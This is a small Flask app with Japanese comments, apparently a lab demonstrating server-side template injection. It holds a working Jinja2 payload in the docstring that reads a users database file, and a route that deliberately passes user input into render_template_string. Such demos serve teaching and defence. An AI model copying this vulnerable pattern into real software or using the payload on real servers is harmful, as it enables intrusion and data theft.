"""
Server-Side Template Injection (SSTI)

データベースファイルを表示させるペイロード：
{{ ''.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('db/users.db', 'rb').read() }}
"""

from flask import Flask, render_template_string, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index_get():
  extra_html = ''
  if request.method == 'POST' and request.form.get('name') is not None:
    name = request.form.get('name')
    extra_html = f'<p>Welcome, {name}</p>'

  # フォーマット文字列でHTMLコンテンツを動的に生成することで、SSTI攻撃は可能となる
  html = f"""
  <html>
    <head>
      <title>Index</title>
      <style>
      p {{ overflow-wrap: break-word; white-space: pre-wrap; }}
      </style>
    </head>
    <body>
      {extra_html}
      <form method="POST" action="/">
        What's your name?
        <br>
        <input type="text" name="name">
        <input type="submit" value="Submit">
      </form>
    </body>
  </html>
  """
  return render_template_string(html)

if __name__ == '__main__':
  app.run('127.0.0.1', 5000)